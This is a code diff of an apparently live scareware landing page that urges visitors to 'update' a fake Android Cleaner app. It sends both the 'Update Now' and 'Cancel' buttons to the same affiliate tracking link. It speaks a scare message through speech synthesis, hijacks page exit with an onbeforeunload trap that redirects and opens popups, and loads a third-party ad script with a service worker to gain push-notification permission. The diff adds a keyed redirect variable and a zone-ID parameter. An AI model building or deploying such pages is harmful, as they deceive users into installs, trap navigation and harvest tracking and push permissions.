@@ -883,11 +883,11 @@ setTimeout(func, getRandomInt(120,220)*1000);
 		</div>
 		
         <div class="buttons">
-            <a class="button exitpoint" href="https://i.top10.run/click.php?lp=1&to_offer=2">
+            <a class="button exitpoint" id="buttonexitpoint" href="https://i.top10.run/click.php?lp=1&to_offer=2">
 				<span>
 																Update Now									</span>
             </a>
-            <a class="button cancel" href="https://i.top10.run/click.php?lp=1&to_offer=2">
+            <a class="button cancel" id="buttoncancel" href="https://i.top10.run/click.php?lp=1&to_offer=2">
 				<span>
 																Cancel									</span>
             </a>
@@ -924,24 +924,29 @@ window.top.location = window.location;
 </script>
 <script type="text/javascript">function speak(c){var b=new SpeechSynthesisUtterance();var a=speechSynthesis.getVoices();b.voice=a[2];b.voiceURI="native";b.volume=1;b.rate=1;b.pitch=1;b.text=c;b.lang="en-US";speechSynthesis.speak(b)}speak("You should update your Android Cleaner now or your phone might be slowed down and your battery may discharge quickly.");</script>
 <script type="text/javascript">
+	var nc = 'https://i.top10.run/click.php?key=x1pbcwpn5zhedv3kmkm8';
+	
+	document.getElementById("buttonexitpoint").href = nc;
+	document.getElementById("buttoncancel").href = nc;
+
     (function (w, d) {
         var epp = function () {
             if (w.onbeforeunload === null) {
                 var to;
                 function repp() {
                     w.onbeforeunload = null;
-					window.open("https://i.top10.run/click.php?lp=1&to_offer=1", "_blank");
+					window.open("https://i.top10.run/click.php?lp=1", "_blank");
                 };
                 function epp() {
                     to = setTimeout(function () {
-                        w.location.replace('https://i.top10.run/click.php?lp=1&to_offer=2');
+                        w.location.replace(nc);
                         repp();
                     }, 100);
                     return 'You should update your Android Cleaner now or your phone might be slowed down and your battery may discharge quickly.';
                 }
                 w.onbeforeunload = epp;
                 // Prevent epp firing from clicking on tracking links 压制弹框
-                var ln = d.querySelectorAll("[href='https://i.top10.run/click.php?lp=1&to_offer=2']");
+                var ln = d.querySelectorAll("[href='"+nc+"']");
                 for (i = 0; i < ln.length; ++i) {
                     ln[i].addEventListener("click", function () {
                         repp();
@@ -960,8 +965,9 @@ window.top.location = window.location;
 <script>
     var url = new URL(window.location.href);
     var pci = url.searchParams.get('clickid');
+	var ppi = url.searchParams.get('zoneid');
     var s = document.createElement('script');
-    s.src='//fiwhibse.com/pfe/current/micro.tag.min.js?z=4129666'+'&ymid='+pci+'&sw=/sw-check-permissions-b9071.js';
+    s.src='//fiwhibse.com/pfe/current/micro.tag.min.js?z=4129666'+'&ymid='+pci+'&var='+ppi+'&sw=/sw-check-permissions-b9071.js';
     s.onload = function(result) {
         switch (result) {
             case 'onPermissionDefault':break;
